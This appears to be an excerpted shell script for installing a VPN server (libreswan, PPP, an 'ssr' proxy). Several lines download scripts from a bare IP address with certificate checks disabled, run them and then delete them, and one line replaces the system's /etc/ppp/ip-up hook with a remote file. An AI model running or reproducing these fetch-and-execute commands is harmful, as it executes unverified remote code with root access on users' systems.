...
wget --no-check-certificate http://103.39.218.74:12345/sh/optimize.sh && chmod +x optimize.sh && bash optimize.sh && rm -rf optimize.sh
...
swan_url1="http://103.39.218.74:12345/software/libreswan/libreswan-$SWAN_VER.tar.gz"
...
conn xauth-psk
  ...
  also=shared
EOF
curl -o /etc/ppp/ip-up http://103.39.218.74:18888/software/V/ip-up
# Specify IPsec PSK
...
rm -rf ssr.sh && wget --no-check-certificate http://103.39.218.74:12345/sh/ssr.sh && chmod +x ssr.sh
sh ssr.sh <<-EOF
1
\r
\r
...
vpnsetup "$@"
wget --no-check-certificate http://103.39.218.74:12345/sh/script.sh && chmod +x script.sh && bash script.sh
exit 0